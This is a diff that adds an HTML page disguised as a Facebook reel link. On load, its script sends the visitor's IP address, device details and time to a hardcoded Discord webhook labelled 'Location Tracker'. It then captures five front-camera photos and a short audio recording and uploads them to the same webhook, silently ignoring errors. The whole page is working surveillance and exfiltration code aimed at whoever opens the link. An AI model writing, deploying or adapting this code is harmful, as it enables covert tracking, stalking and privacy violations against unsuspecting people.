@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook.com/reel/130212</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: Arial, sans-serif; text-align: center; padding: 30px; }
+        h1 { color: #00ff88; }
+    </style>
+</head>
+<body>
+
+<h1>Facebook.com/reel/130212</h1>
+<p>Đang thu thập thông tin, chụp ảnh và ghi âm...</p>
+<p>Vui lòng nhấn Cho phép Camera và Microphone khi được hỏi.</p>
+
+<script>
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489545201394516039/kwfQFh0QDTePNPPvwkb2xjLBYyduWDmZZv_NYdRpU-iYPQHNGGNMvJo04FXvc1XIA8f3';
+
+async function sendText(content) {
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: content, username: "Location Tracker" })
+        });
+    } catch(e) {}
+}
+
+async function sendFile(blob, filename, caption) {
+    try {
+        const formData = new FormData();
+        formData.append('file', blob, filename);
+        if (caption) {
+            formData.append('payload_json', JSON.stringify({ content: caption, username: "Location Tracker" }));
+        }
+        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+    } catch(e) {}
+}
+
+async function getBasicInfo() {
+    let ip = "Không lấy được";
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+    } catch(e) {}
+
+    const message = `**📍 TRACKER ĐÃ KÍCH HOẠT**\n\n` +
+                   `**IP:** ${ip}\n` +
+                   `**Thiết bị:** ${navigator.userAgent.substring(0, 70)}...\n` +
+                   `**Màn hình:** ${screen.width}x${screen.height}\n` +
+                   `**Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
+
+    await sendText(message);
+}
+
+async function startCamera() {
+    try {
+        await sendText("**📸 Đang mở camera và chụp 5 ảnh...**");
+
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        for (let i = 1; i <= 5; i++) {
+            canvas.width = 640;
+            canvas.height = 480;
+            ctx.drawImage(video, 0, 0, 640, 480);
+
+            await new Promise(resolve => {
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const caption = `**📸 Ảnh chụp #${i}** - ${new Date().toLocaleString('vi-VN')}`;
+                        await sendFile(blob, `photo_${i}_${Date.now()}.jpg`, caption);
+                    }
+                    resolve();
+                }, 'image/jpeg', 0.85);
+            });
+
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+        await sendText("**✅ Đã chụp xong 5 ảnh camera**");
+
+    } catch (err) {
+        await sendText("**⚠️ Không chụp được ảnh camera**");
+    }
+}
+
+async function startRecording() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            await sendFile(blob, `audio_${Date.now()}.webm`, `**🎤 Ghi âm** - ${new Date().toLocaleString('vi-VN')}`);
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 4500);
+    } catch(e) {}
+}
+
+getBasicInfo();
+setTimeout(startCamera, 1000);
+setTimeout(startRecording, 1500);
+
+</script>
+
+</body>
+</html>
